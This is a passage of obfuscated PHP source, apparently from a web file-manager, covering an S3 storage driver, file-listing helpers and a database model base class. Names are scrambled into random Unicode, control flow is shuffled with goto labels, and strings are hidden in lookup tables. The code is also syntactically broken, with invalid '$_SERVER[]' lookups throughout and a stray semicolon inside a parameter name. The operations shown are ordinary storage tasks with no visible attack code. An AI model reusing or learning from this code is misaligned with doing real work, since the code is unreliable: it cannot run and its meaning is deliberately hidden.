(isset($Eч[$B瘢[162]][$B瘢[164]])) { $a窋 = $Eч[$B瘢[162]][$B瘢[164]]; } else { $a窋 = md5("{$Eч[$B瘢[28]]}\x5f{$Eч[$B瘢[75]]}\x5f{$Eч[$B瘢[77]]}"); } } $C҇Ũŏ = "{$a窋}\x5f{$d}\x2e\160\156\x67"; goto F; D: $A͍ = DATA_THUMB . $C҇Ũŏ; if (!@file_exists($A͍)) { $b = TEMP_FILES; if (!is_dir($b)) { mk_dir($b); } $D = $b . $a窋 . $B瘢[91] . $Eч[$B瘢[160]]; if (!@file_exists($D)) { $D = $this->download($fݖŐ, $D); } $D抚Ɇ = new ImageThumb($D, $B瘢[167]); $D抚Ɇ->prorate($A͍, $d, $d * 10); } if (!file_exists($A͍) || filesize($A͍) < 100) { return @file_exists($D) ? IO::fileOut($D) : $this->fileOut($fݖŐ); } goto A; fƚ: } public function fileOutImageServer($a䆒, $C޴˚ = 250) { $this->fileOutImage($a䆒, $C޴˚); } public function fileNameAuto($cܑ, $D݂, $F = REPEAT_RENAME, $b͢Ӭ = false) { goto AߑϢ; a펬Ĩ: if ($F == REPEAT_SKIP) { return !1; } $bź = $bߦ[91] . get_path_ext($D݂); $bź = $bź == $bߦ[91] || $b͢Ӭ ? $bߦ[33] : $bź; goto C摲; C摲: $A = 1; $D䓗ȝ = substr($D݂, 0, strlen($D݂) - strlen($bź)); $Fщϓ = $D䓗ȝ . "\50{$A}\x29{$bź}"; goto F譵; AߑϢ: $bߦ =& $_SERVER[]; $cՃ = $cܑ === $bߦ[33] ? $D݂ : rtrim($cܑ, $bߦ[8]) . $bߦ[8] . $D݂; if ($F == REPEAT_REPLACE || !$this->exist($cՃ) || $b͢Ӭ && $F != REPEAT_RENAME_FOLDER) { return $D݂; } goto a펬Ĩ; F譵: while ($this->exist(rtrim($cܑ, $bߦ[8]) . $bߦ[8] . $Fщϓ)) { $Fщϓ = $D䓗ȝ . "\x28{$A}\51{$bź}"; $A++; } return $Fщϓ; goto F۞; F۞: } public function listAllFiles($Aʐ뾹, $e֍, $E = array()) { goto f΅; cƏ: foreach (array_unique($dԮ) as $c) { $b = array($D㾽ޚ[75] => $this->getPathOuter($D㾽ޚ[8] . $Aʐ뾹 . $D㾽ޚ[8] . $c), $D㾽ޚ[76] => 1, $D㾽ޚ[77] => 0); if (substr($c, -1) != $D㾽ޚ[8]) { $b[$D㾽ޚ[76]] = 0; $cꎚ = $this->getPath($Aʐ뾹 . $D㾽ޚ[8] . $c); $b[$D㾽ޚ[77]] = isset($E[$cꎚ]) ? $E[$cꎚ] : $this->size($cꎚ); } $c[] = $b; } return $c; goto cē; f΅: $D㾽ޚ =& $_SERVER[]; if (empty($e֍)) { return array(); } $dԮ = array(); goto CЯ; CЯ: $Aʐ뾹 = trim($Aʐ뾹, $D㾽ޚ[8]); foreach ($e֍ as $c) { $F퉈۳ = ltrim(substr($c, strlen($Aʐ뾹)), $D㾽ޚ[8]); $dԮ = array_merge($dԮ, $this->slicePath($F퉈۳)); } $c = array(); goto cƏ; cē: } public function slicePath($Cދܼ) { $dߑ =& $_SERVER[]; $a粧 = explode($dߑ[8], trim($Cދܼ, $dߑ[8])); $A✇ = 0; do { ++$A✇; $AԨ[] = implode($dߑ[8], array_slice($a粧, 0, $A✇)) . $dߑ[8]; } while ($A✇ < count($a粧)); $AԨ[count($a粧) - 1] = $Cދܼ; return $AԨ; } public function getHost() { $d׻ɛ =& $_SERVER[]; $cՉ = parse_url(trim($this->domain, $d׻ɛ[8])); $f۽ = isset($cՉ[$d׻ɛ[168]]) ? $cՉ[$d׻ɛ[168]] : http_type(); $Bێ = isset($cՉ[$d׻ɛ[169]]) ? $cՉ[$d׻ɛ[169]] : $cՉ[$d׻ɛ[75]]; if (isset($cՉ[$d׻ɛ[170]])) { $Bێ .= $d׻ɛ[4] . $cՉ[$d׻ɛ[170]]; } return $f۽ . $d׻ɛ[171] . $Bێ; } public function pathEncode($Eؼլ) { $EѶ =& $_SERVER[]; return str_replace($EѶ[172], $EѶ[8], rawurlencode($Eؼլ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($A݆) { set_timeout(); require_once SDK_DIR . $_SERVER[][173]; parent::__construct(); $this->_init($A݆); } public function _init($Dƅⷪ) { foreach ($Dƅⷪ as $dؗ => $Cޥ) { if (isset($this->{$dؗ})) { $this->{$dؗ} = $Cޥ; } } $this->endpoint = $Dƅⷪ[$_SERVER[][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($aϗ = "\166\x34") { $this->signVer = $aϗ; $this->client->setSignatureVersion($aϗ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto A腽; a: $DƔ = array($b麇[180], $b麇[181], $b麇[182], $b麇[183], $b麇[184]); $cخ = array_diff($DƔ, $fꉣ); return empty($cخ); goto a׹; BЄ軱: if ($bև[$b麇[175]] != $b麇[176] || $bև[$b麇[177]] != $b麇[176]) { return !1; } $fꉣ = array_map($b麇[178], $bև[$b麇[179]]); if (!is_array($fꉣ)) { $fꉣ = array(); } goto a; A腽: $b麇 =& $_SERVER[]; $bև = $this->getBucketCors(); if (!$bև || !is_array($bև)) { return !1; } goto BЄ軱; a׹: } public function mkfile($D, $E = '', $Fۘʔ = REPEAT_RENAME) { $Eɶ = $this->setContent($D, $E); if ($Eɶ !== !1) { return $this->getPathOuter($D); } return !1; } public function mkdir($C, $aѱ = REPEAT_SKIP) { if (empty($C)) { return !1; } if ($this->_isFolder($C)) { return $this->getPathOuter($C); } $C滌 = $this->setContent($C, $_SERVER[][33], !0); if ($C滌 !== !1) { return $this->getPathOuter($C); } return !1; } public function copyFile($Bν, $d, $A = array()) { $B =& $_SERVER[]; $c = $this->objectMeta($Bν); if (!$c) { return !1; } if ($c[$B[77]] <= 1024 * 1024 * 200) { $E = $this->client->copyObject($this->bucket, $Bν, $this->bucket, $d, $B[185], $A); } else { $E = $this->client->multiCopyObject($this->bucket, $Bν, $this->bucket, $d, $A); } $E = $E ? $this->getPathOuter($d) : !1; return $E; } public function moveFile($d馫⤕, $F噧) { if ($this->copyFile($d馫⤕, $F噧)) { $this->delFile($d馫⤕); return $this->getPathOuter($F噧); } return !1; } public function delFile($eȉЌ) { return $this->client->deleteObject($this->bucket, $eȉЌ); } public function delFolder($d) { goto f; Eވ: return $Fߞ === $eҺ ? !0 : !1; goto d򼧠; B: $Fߞ = $eҺ = 0; $D = array_chunk(array_keys($D൐), 1000); foreach ($D as $b) { $Fߞ++; $eҺ += (int) $this->client->deleteObjects($this->bucket, $b); } goto Eވ; f: $Aβ =& $_SERVER[]; $D൐ = $this->listObjs($d); if (!$D൐) { $d = trim($d, $Aβ[8]); if (!empty($d)) { $d .= $Aβ[8]; } return $this->delFile($d); } goto B; d򼧠: } public function rename($D, $Cો) { return $this->renameObject($D, $Cો); } public function listPath($b, $dǸ = false) { $eޗ =& $_SERVER[]; $C = $this->listObjs($b, null, null, $eޗ[8]); $Eͫ = array($eޗ[74] => array(), $eޗ[73] => array()); foreach ($C as $f҈謧 => $Dݍ򛢻) { if ($f҈謧 == $eޗ[8]) { continue; } if (isset($Dݍ򛢻[$eޗ[186]])) { $Eͫ[$eޗ[74]][] = $this->folderInfo($Dݍ򛢻[$eޗ[186]], $dǸ); } else { if (substr($Dݍ򛢻[$eޗ[28]], -1) == $eޗ[8]) { continue; } $Eͫ[$eޗ[73]][] = $this->fileInfo($Dݍ򛢻[$eޗ[28]], $dǸ, $Dݍ򛢻); } } return $Eͫ; } private function fileInfo($E, $D˒ = false, $Aİƚ = array()) { goto fԛ; fԛ: $d =& $_SERVER[]; if ($D˒) { return array($d[28] => $this->pathThis($E), $d[75] => $this->getPathOuter($E), $d[29] => $d[167], $d[160] => $this->ext($E), $d[77] => isset($Aİƚ[$d[77]]) ? $Aİƚ[$d[77]] : 0, $d[187] => 0, $d[107] => 0, $d[188] => !0, $d[189] => !0); } $Aɭ = array($d[28] => $this->pathThis($E), $d[75] => $this->getPathOuter($E), $d[29] => $d[167], $d[187] => 0, $d[107] => 0, $d[77] => 0, $d[160] => $this->ext($E), $d[188] => !0, $d[189] => !0); goto Cς; b: return $Aɭ; goto d󔿭; Cς: if (empty($Aİƚ)) { $Aİƚ = $this->objectMeta($E); if (!$Aİƚ) { return $Aɭ; } } if (isset($Aİƚ[$d[190]])) { $Aɭ[$d[107]] = $Aİƚ[$d[190]]; } if (isset($Aİƚ[$d[77]])) { $Aɭ[$d[77]] = $Aİƚ[$d[77]]; } goto b; d󔿭: } private function folderInfo($Aܠ, $aǧߏ = false) { goto eƘ; eƘ: $eȘ =& $_SERVER[]; if ($aǧߏ) { return array($eȘ[28] => $this->pathThis($Aܠ), $eȘ[75] => $this->getPathOuter($eȘ[8] . $Aܠ), $eȘ[29] => $eȘ[76], $eȘ[188] => !0, $eȘ[189] => !0); } $aҘ = array($eȘ[28] => $this->pathThis($Aܠ), $eȘ[75] => $this->getPathOuter($eȘ[8] . $Aܠ), $eȘ[29] => $eȘ[76], $eȘ[187] => 0, $eȘ[107] => 0, $eȘ[188] => !0, $eȘ[189] => !0); goto d; d: if ($Aܠ == $eȘ[33]) { return $aҘ; } $Aܠ = trim($Aܠ, $eȘ[8]) . $eȘ[8]; $e = $this->objectMeta($Aܠ); goto A؃; A؃: if (isset($e[$eȘ[190]])) { $aҘ[$eȘ[187]] = $e[$eȘ[190]]; } return $aҘ; goto Dކ; Dކ: } public function listObjs($bܣ, $b = null, $E = null, $bɍȌ = null) { $E =& $_SERVER[]; $bܣ = trim($bܣ, $E[8]); $eц = empty($bܣ) ? $E[33] : $bܣ . $E[8]; return $this->client->getBucket($this->bucket, $eц, $b, $E, $bɍȌ, !0); } public function has($Fˢ, $a꽋 = false, $fӽ = true) { goto C±; C񲝄: $E𺟼 = $this->listObjs($Fˢ, null, null, $E[8]); $E𺟼 = is_array($E𺟼) ? $E𺟼 : array(); foreach ($E𺟼 as $f) { if (isset($f[$E[28]]) && substr($f[$E[28]], -1) != $E[8]) { if (!$a꽋 && $fӽ) { return !0; } $e֌++; } else { if (isset($f[$E[186]])) { if (!$a꽋 && !$fӽ) { return !1; } $a׈++; } } } goto CΑ͠; CΑ͠: if ($a꽋) { return array($E[191] => $e֌, $E[192] => $a׈); } return !1; goto Fڋ쬾; C±: $E =& $_SERVER[]; $e֌ = 0; $a׈ = 0; goto C񲝄; Fڋ쬾: } public function listAll($aԇ) { $C =& $_SERVER[]; $Dц̛ = $this->listObjs($aԇ); $Fݤ = $c = array(); foreach ($Dц̛ as $d => $E) { $Fݤ[] = $E[$C[28]]; $c[$d] = $E[$C[77]]; } return $this->listAllFiles($aԇ, $Fݤ, $c); } public function canRead($dק) { $A =& $_SERVER[]; $F먑 = $this->client->getAccessControlPolicy($this->bucket, $dק); if (!$F먑) { return !1; } return in_array($F먑, array($A[193], $A[194], $A[195])) ? !0 : !1; } public function canWrite($Aɯ) { $bצ =& $_SERVER[]; $DȨ = $this->client->getAccessControlPolicy($this->bucket, $Aɯ); if (!$DȨ) { return !1; } return in_array($DȨ, array($bצ[193], $bצ[194])) ? !0 : !1; } public function getContent($ạ) { return $this->client->getObject($this->bucket, $ạ); } public function setContent($aɊ, $a긍׳ = '', $dݫה = false) { goto Eȯ𳑴; Eȯ𳑴: $F۸୑ =& $_SERVER[]; $aɊ = $dݫה ? trim($aɊ, $F۸୑[8]) . $F۸୑[8] : $aɊ; $B􈸎 = get_file_mime(get_path_ext($aɊ)); goto aȘ; aȘ: $a = $this->client->putObject($a긍׳, $this->bucket, $aɊ, $F۸୑[185], array(), $B􈸎); if (!$a) { return !1; } if ($dݫה) { return !0; } goto F; F: $a = $this->copyFile($aɊ, $aɊ, array($F۸୑[196] => $a[$F۸୑[197]])); return $a ? !0 : !1; goto c仴ʮ; c仴ʮ: } public function fileSubstr($dب, $f摮;, $cé) { $d = $f摮; + $cé - 1; return $this->client->getObject($this->bucket, $dب, array($_SERVER[][198] => "\x62\x79\x74\x65\x73\75{$f摮;}\55{$d}")); } public function upload($dՔ, $c¨, $Aȉ = false, $F׊ = REPEAT_REPLACE) { $E؛ =& $_SERVER[]; $FԆ̠ = array($E؛[196] => @md5_file($c¨)); $B = array($E؛[199] => get_file_mime(get_path_ext($dՔ))); if (IO::size($c¨) <= 1024 * 1024 * 200) { $cƒ = $this->client->putObjectFile($c¨, $this->bucket, $dՔ, $E؛[185], $FԆ̠, $B); return !empty($cƒ) ? $this->getPathOuter($dՔ) : !1; } $bۛ = $this->client->multiUploadObject($c¨, $this->bucket, trim($dՔ, $E؛[8]), $FԆ̠, $B); return $bۛ ? $this->getPathOuter($dՔ) : !1; } public function download($E, $c) { if (!@is_dir($this->pathFather($c)) && !IO::mkdir($this->pathFather($c))) { return !1; } $a = $this->client->getObject($this->bucket, $E, array(), $c); return $a !== !1 ? $c : !1; } public function link($D, $bˋ = array()) { $A =& $_SERVER[]; if ($this->signVer == $A[200]) { return $this->client->getAuthenticatedURL($this->bucket, $D, 3600 * 12, $bˋ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($D, $A[8]), 3600 * 12, $this->region, array(), !0, $bˋ); } public function fileOut($D֑, $CŽ = false, $d߯ = false, $F˜ = '') { goto c; c: $fć =& $_SERVER[]; if (!$d߯) { $d߯ = $this->pathThis($D֑); } $F = get_file_mime(get_path_ext($d߯)); goto b; A۾: $c¬ = $this->link($D֑, $eԥ); $this->fileOutLink($c¬); goto aُ; b: if ($F == $fć[201]) { return parent::fileOut($D֑, $CŽ, $d߯, $F˜); } $CŽ = $CŽ ? $fć[202] : $fć[203]; $eԥ = array($fć[204] => $CŽ . $fć[205] . rawurlencode($d߯), $fć[206] => $F); goto A۾; aُ: } public function fileOutServer($F, $Bە = false, $F = false, $a = '') { parent::fileOut($F, $Bە, $F, $a); } public function fileOutImage($Aʬ, $bօ = 250) { $B湣 = $this->link($Aʬ); $this->fileOutLink($B湣); } public function fileOutImageServer($C獇¦, $f = 250) { parent::fileOutImage($C獇¦, $f); } public function hashMd5($B, $CƂ = '') { $Dύ =& $_SERVER[]; $eȬ = $this->objectMeta($B); if (!$eȬ) { return !1; } $CƂ = $CƂ ? $CƂ : _get($eȬ, $Dύ[207]); $CƂ = $CƂ ? $CƂ : _get($eȬ, $Dύ[197], $Dύ[33]); return $CƂ; } public function uploadFormData($eߥ, $E = 3600) { $Aȕ =& $_SERVER[]; $e = $this->pathFather($eߥ); $B߾ = $this->client->getHttpUploadPostParams($this->bucket, $e, $Aȕ[185], $E); return array_merge((array) $B߾, array($Aȕ[169] => $this->getHost())); } public function multiUploadFormData($D, $Bˡ܆ = 3600) { $aȚ =& $_SERVER[]; $Cʫ = gmdate($aȚ[208]); $C = array(); $Aݝ = $this->client->getUploadId($this->bucket, $D, $C); if (!$Aݝ) { return !1; } return array($aȚ[209] => $Aݝ, $aȚ[169] => $this->getHost() . $aȚ[8] . $this->pathEncode($D), $aȚ[210] => $Cʫ, $aȚ[89] => $D); } public function multiUploadAuthData($aά, $d = array()) { goto EЉ; EЉ: $F =& $_SERVER[]; $bܑ = isset($d[$F[210]]) ? $d[$F[210]] : gmdate($F[208]); $A܎ = isset($d[$F[160]]) ? $d[$F[160]] : $F[33]; goto EÖ; Cݲ: if (strpos($A܎, $F[213]) === 0) { return array($F[220] => $b␾, $F[210] => $bܑ); } return $b␾; goto fǻ굔; EÖ: $fƅ = $d[$F[89]]; unset($d[$F[89]]); if (isset($d[$F[211]])) { $d[$F[210]] = $bܑ; return $this->listUploadParts($fƅ, $d); } goto eܩ; a͵: $B = implode($F[217], $aȝ); $D܉ = base64_encode(hash_hmac($F[218], $B, $this->secret, !0)); $b␾ = $F[219] . $this->accessKey . $F[4] . $D܉; goto Cݲ; eܩ: $aȝ = array($F[212], $F[33], $F[116], $F[33], "\x78\x2d\x61\x6d\x7a\x2d\x64\141\164\x65\72{$bܑ}", $F[8] . $this->bucket . $F[8] . $this->pathEncode($fƅ) . $A܎); if (strpos($A܎, $F[213]) === 0) { $aȝ[0] = $F[214]; } if (isset($d[$F[215]]) && $d[$F[215]] == $F[216]) { $aȝ[0] = $F[216]; } goto a͵; fǻ굔: } public function listUploadParts($aޠӷ, $EΙ = array()) { goto e; e: $a֮ =& $_SERVER[]; $cǍ = str_replace($a֮[221], $a֮[33], $EΙ[$a֮[160]]); $d = $this->client->listParts($this->bucket, $aޠӷ, $cǍ); goto DÈ; aƍ: $Dς = $this->multiUploadAuthData($aޠӷ, $EΙ); if (empty($Dς)) { return !1; } return array($a֮[220] => $Dς, $a֮[210] => $EΙ[$a֮[210]], $a֮[222] => $d); goto Aܔ; DÈ: if (!$d) { return !1; } unset($EΙ[$a֮[211]], $EΙ[$a֮[215]]); $EΙ[$a֮[89]] = $aޠӷ; goto aƍ; Aܔ: } public function getHost() { return parent::getHost() . $_SERVER[][8] . $this->bucket; } public function size($cв) { $Eš = $this->objectMeta($cв); return $Eš ? $Eš[$_SERVER[][77]] : 0; } public function info($FՖ) { if ($this->isFolder($FՖ)) { return $this->folderInfo($FՖ); } else { if ($this->isFile($FՖ)) { return $this->fileInfo($FՖ); } } return !1; } public function exist($b●ō) { return $this->isFile($b●ō) || $this->isFolder($b●ō); } public function isFile($d) { return !$this->isFolder($d) && $this->objectMeta($d); } public function isFolder($a) { return $this->cacheMethod($_SERVER[][223], $a); } protected function objectMeta($eҝώ) { return $this->cacheMethod($_SERVER[][224], $eҝώ); } protected function _objectMeta($C˼) { $aŔ =& $_SERVER[]; $C˼ = rtrim($C˼, $aŔ[8]); try { $C = $this->client->getObjectInfo($this->bucket, $C˼); if (!isset($C[$aŔ[207]]) && isset($C[$aŔ[225]])) { $C[$aŔ[207]] = $C[$aŔ[225]]; } } catch (Exception $E) { $C = !1; } if (!$C) { } return $C; } protected function _isFolder($EЄښ) { goto b̃; A: $C = $this->client->getBucket($this->bucket, $EЄښ, null, 1); if (empty($C)) { return !1; } $C = array_values($C); goto Dޟ; b̃: $FϠ =& $_SERVER[]; $EЄښ = rtrim($EЄښ, $FϠ[8]); if ($EЄښ == $FϠ[33] || $EЄښ == $FϠ[8]) { return !0; } goto A; Dޟ: if (substr($C[0][$FϠ[28]], -1) == $FϠ[8]) { return !0; } if (get_path_this($C[0][$FϠ[28]]) == get_path_this($EЄښ)) { return !1; } return !0; goto cԻǔ; cԻǔ: } } define($_SERVER[][226], 1); goto eܛ; b: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\146\171\124\x69\x6d\145", "\164\151\x6d\x65", "\x69\156\x73\145\x72\x74\54\x75\160\x64\x61\x74\145", "\146\x75\x6e\x63\x74\151\157\x6e"), array("\143\x72\x65\141\164\x65\124\151\x6d\x65", "\164\151\155\145", "\x69\156\x73\x65\x72\164", "\146\x75\156\x63\x74\x69\157\156")); public function setDataAuto($F) { $this->dataAuto = $F; } public function __construct($EŦ = '', $C = '', $eҰ = '') { parent::__construct($EŦ, $C, $eҰ); } public static function textEncode($A֪) { if (!$A֪) { return $A֪; } $D߳̾ = json_encode($A֪); $D߳̾ = preg_replace_callback($_SERVER[][342], function ($dǐ) { return addslashes($dǐ[0]); }, $D߳̾); return json_decode($D߳̾); } public static function textDecode($Fņש) { $E =& $_SERVER[]; $A픙 = json_encode($Fņש); $A픙 = preg_replace_callback($E[343], function ($A) { return $_SERVER[][93]; }, $A픙); return json_decode($A픙); } protected $tableMeta = array(); protected function _beforeInsert(&$Dޅ, $BЅ) { $C =& $_SERVER[]; if (!$this->checkDataAutoHas($C[344])) { return; } $this->dataBeforeFilter($Dޅ, $C[344]); } protected function _beforeUpdate(&$f󢳩, $F) { $bﾹ =& $_SERVER[]; if (!$this->checkDataAutoHas($bﾹ[345])) { return; } $this->dataBeforeFilter($f󢳩, $bﾹ[345]); } protected function _afterSelect(&$D, $fÒ) { if (!is_array($D)) { return; } if (!$this->checkDataAutoHas($_SERVER[][346])) { return; } foreach ($D as &$c炐) { $this->dataAfterFilter($c炐); } } protected function _afterFind(&$B, $e) { if (!is_array($B)) { return; } if (!$this->checkDataAutoHas($_SERVER[][346])) { return; } $this->dataAfterFilter($B); } public function setAutoIncrement($BΦ) { $bԐ = array($this->getPk() => $BΦ); $fŬ = $this->data($bԐ)->add(); if ($fŬ) { $this->delete($fŬ); } } public function getAutoIncrement() { $f˄ = $this->getTableName(); $dܵ = $this->max($this->getPk()); $eը = $this->query("\x73\x68\x6f\167\x20\164\141\142\154\145\x20\163\x74\x61\x74\x75\x73\x20\167\x68\x65\x72\145\x20\116\141\155\x65\x3d\47{$f˄}\47"); $D = $eը[0][$_SERVER[][347]]; $d = max($dܵ, $D); return $d; } protected function _callBefore($Aᎊς, $Bưɚ) { return $this->cacheCallCheck($Aᎊς, $Bưɚ, !1); } protected function _callAfter($bｃ݊, $A󪎙) { return $this->cacheCallCheck($bｃ݊, $A󪎙, !0); } protected function cacheFunctionAlias($Dט) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($bʔ, $eщ, $c鸔 = false) { $D􃎰 = $this->cacheFunctionAlias($eщ); if (!$D􃎰) { return; } foreach ($D􃎰 as $eٔ => $eȟ) { $bǴ = $eȟ[0]; $f = explode($_SERVER[][47], $eȟ[1]); if ($bʔ == $eٔ) { return $this->cacheFunctionGet($eٔ, $bǴ); } if ($c鸔 && in_array($bʔ, $f)) { $this->cacheFunctionClear($eٔ, $bǴ); } } } public function cacheFunctionGet($fɐ, $fǈ) { $B̜ = $this->cacheKeyMake($fɐ, $fǈ); $B = Cache::get($B̜); if (!is_array($B)) { $B = call_user_func_array(array($this, $fɐ), array($fǈ, !0)); Cache::set($B̜, $B); } return $B; } public function cacheFunctionClear($D, $Cج) { $BЮ = $Cج; if (!is_array($Cج)) { $BЮ = array($Cج); } foreach ($BЮ as $Eó) { $E = $this->cacheKeyMake($D, $Eó); Cache::remove($E); } } private function cacheKeyMake($F, $Eی) { $Fٳ =& $_SERVER[]; return get_class($this) . $Fٳ[70] . $F . $Fٳ[348] . $Eی; } protected function selectPage($f = 200, $c𝽎 = 1) { goto e݃; EΫ: if ($B帖 == 1) { $A؋ = count($Eձ); } $Ď޿ = array($dꮃ쥲[351] => array($dꮃ쥲[352] => $A؋, $dꮃ쥲[349] => $f, $dꮃ쥲[340] => $c𝽎, $dꮃ쥲[353] => $B帖), $dꮃ쥲[354] => $Eձ ? $Eձ : array()); return $Ď޿; goto f; fֵ: $this->optionsValue($AƱ); $Eձ = $this->page($c𝽎, $f)->select(); $Eձ = is_array($Eձ) ? $Eձ : array(); goto EΫ; e݃: $dꮃ쥲 =& $_SERVER[]; global $in; $AƱ = $this->optionsValue(); goto cԑݾ; D: $A؋ = intval($this->count()); $f = intval($f); $f = $f <= 5 ? 5 : ($f >= $Eٓ ? $Eٓ : $f); goto a; cԑݾ: $Eٓ = 4000; $f = isset($in[$dꮃ쥲[349]]) ? $in[$dꮃ쥲[349]] : $f; if ($f === -1) { unset($in[$dꮃ쥲[349]]); $Eٓ = 100000000; $f = $Eٓ; } goto A; A: $E = $AƱ; $E[$dꮃ쥲[350]] = array(); $this->optionsValue($E); goto D; a: $B帖 = ceil($A؋ / $f); $c𝽎 = intval(isset($in[$dꮃ쥲[340]]) ? $in[$dꮃ쥲[340]] : $c𝽎); $c𝽎 = $c𝽎 <= 1 ? 1 : ($c𝽎 >= $B帖 ? $B帖 : $c𝽎); goto fֵ; f: } protected function checkLength($d׳, $bȯ = 0, $bĠѦ = '') { $fâ =& $_SERVER[]; $bȯ = $bȯ ? $bȯ : 65536; if (!$d׳ || strlen($d׳) < $bȯ) { return; } $bĠѦ = $bĠѦ ? $bĠѦ . $fâ[67] : $fâ[33]; show_json($bĠѦ . LNG($fâ[355]) . "\50{$bȯ}\x29", !1); } protected function metaSet($F鄐, $a߲ = null, $AƟ = null) { goto Eӏ; Eݠ: if (is_null($a߲)) { return $c->where(array($C => $F鄐))->delete(); } if (is_null($AƟ) && is_string($a߲)) { return $c->where($d¬)->delete(); } $f© = is_array($a߲) ? $a߲ : array(); goto f҃˰; Eӏ: $aﶇ =& $_SERVER[]; if (!$this->tableMeta) { return !1; } $C = $this->tableMeta[$aﶇ[356]]; goto e޹ȉ; e޹ȉ: $Dڎ = $this->tableMeta[$aﶇ[357]]; $c = Model($Dڎ); $d¬ = array($C => $F鄐, $aﶇ[358] => $a߲); goto Eݠ; D: $c->where(array($C => $F鄐))->addAll($aȧߖ, array(), !0); return !0; goto B͑; f҃˰: if (is_string($a߲)) { $f©[$a߲] = $AƟ; } $aȧߖ = array(); foreach ($f© as $Dտ => $a҃) { $this->checkLength($a҃, !1, $Dڎ . $aﶇ[4] . $Dտ); $aȧߖ[] = array($C => $F鄐, $aﶇ[89] => $Dտ, $aﶇ[359] => $a҃); } goto D; B͑: } public function metaGet($B, $F׉ю = false) { goto a; a: $c轱 =& $_SERVER[]; if (!$this->tableMeta) { return array(); } $B = $this->tableMeta[$c轱[356]]; goto cџ; A殜: $A = $eք܌->field($c轱[360])->where($f۩)->select(); $A = array_to_keyvalue($A, $c轱[89], $c轱[359]); return $A; goto F٭̽; cџ: $eք܌ = Model($this->tableMeta[$c轱[357]]); if ($F׉ю) { $f۩ = array($B => $B, $c轱[89] => $F׉ю); return $eք܌->where($f۩)->getField($c轱[359]); } $f۩ = array($B => $B); goto A殜; F٭̽: } private function checkDataAutoHas($AҺ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $a) { if (in_array($AҺ, explode($_SERVER[][47], $a[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$eѽ쑇, $d) { $a =& $_SERVER[]; foreach ($this->dataAuto as $C˒) { $cͤ = $C˒[0]; if (!in_array($d, explode($a[47], $C˒[2]))) { continue; } switch (trim($C˒[3])) { case $a[309]: case $a[310]: $eƄԷ = $C˒[1]; $E = isset($C˒[4]) ? (array) $C˒[4] : array(); if ($eƄԷ == $a[190] && array_key_exists($cͤ, $eѽ쑇)) { if (!$eѽ쑇[$cͤ]) { unset($eѽ쑇[$cͤ]); } break; } if (isset($eѽ쑇[$cͤ])) { array_unshift($E, $eѽ쑇[$cͤ]); } if ($a[309] == $C˒[3]) { $eѽ쑇[$cͤ] = call_user_func_array($eƄԷ, $E); } else { $eѽ쑇[$cͤ] = call_user_func_array(array(&$this, $eƄԷ), $E); } break; case $a[261]: $eѽ쑇[$cͤ] = $eѽ쑇[$C˒[1]]; break; case $a[282]: if (isset($eѽ쑇[$cͤ]) && !is_string($eѽ쑇[$cͤ])) { $eѽ쑇[$cͤ] = json_encode_force($eѽ쑇[$cͤ]); } break; case $a[311]: if ($eѽ쑇[$cͤ] === $a[33]) { unset($eѽ쑇[$cͤ]); } break; case $a[312]: $eѽ쑇[$cͤ] = $C˒[1]; default: break; } } if ($d == $a[344]) { $e͢՝ = strtolower($this->db->getDbType()); if (strpos($e͢՝, $a[9]) !== 0) { return; } $eΓ = $this->field(!0)->fields; $Eҫɷ = $eΓ[$a[240]]; if (isset($eΓ[$a[239]])) { unset($Eҫɷ[$eΓ[$a[239]]]); } foreach ($Eҫɷ as $bꚡ => $d) { if (!isset($eѽ쑇[$bꚡ])) { $eѽ쑇[$bꚡ] = $a[33]; } } } } private function dataAfterFilter(&$B) { $B笾 =& $_SERVER[]; foreach ($this->dataAuto as $e) { $e = $e[0]; if (!in_array($B笾[346], explode($B笾[47], $e[2]))) { continue; } if (!isset($B[$e])) { continue; } switch (trim($e[3])) { case $B笾[309]: case $B笾[310]: $eȽ = isset($e[4]) ? (array) $e[4] : array(); array_unshift($eȽ, $B[$e]); if ($B笾[309] == $e[3]) { $B[$e] = call_user_func_array($e[1], $eȽ); } else { $B[$e] = call_user_func_array(array(&$this, $e[1]), $eȽ); } break; case $B笾[261]: $B[$e] = $B[$e[1]]; break; case $B笾[282]: $d次 = $B[$e]; $B[$e] = json_decode($d次, !0); if (is_null($B[$e])) { $B[$e] = $d次; } break; case $B笾[311]: if ($B[$e] === $B笾[33]) { unset($B[$e]); } break; case $B笾[312]: $B[$e] = $e[1]; default: break; } } } public function saveAll($BК) { goto e; fӍ: $this->chunkEventSet(); goto Bٍك; F׳ν: $eޏ = array(); $F䪨͑ = count($BК); for ($Dʔ = 0; $Dʔ < $F䪨͑; $Dʔ++) { $aǯ = $BК[$Dʔ]; if (!is_array($aǯ) || count($aǯ) != 4) { continue; } $c = "\x55\x50\104\101\124\105\40\x60{$f}\x60\40\123\x45\x54\x20{$aǯ[2]}\40\75\40\x43\x41\123\105\40{$aǯ[0]}\x20\xa"; if ($f == 0) { $E˛ = $c; } $eޏ[] = $C۸ᅟ[113] . $aǯ[1] . $C۸ᅟ[113]; $f++; $E˛ .= "\40\127\x48\105\x4e\x20\47{$aǯ[1]}\x27\x20\x54\110\105\116\x20\47{$aǯ[3]}\47\x20\12"; if ($f == $eԴ || $Dʔ == $F䪨͑ - 1) { goto b; aΒ㹚: $eޏ = array(); goto aϖ҅; F̞: $f = 0; $E˛ = $c; $this->chunkEventCheck(count($eޏ)); goto aΒ㹚; b: $D߆ӵ = implode($C۸ᅟ[47], $eޏ); $E˛ .= "\40\105\116\104\x20\40\127\x48\x45\x52\x45\x20{$aǯ[0]}\x20\x49\x4e\x20\x28{$D߆ӵ}\51\x20"; 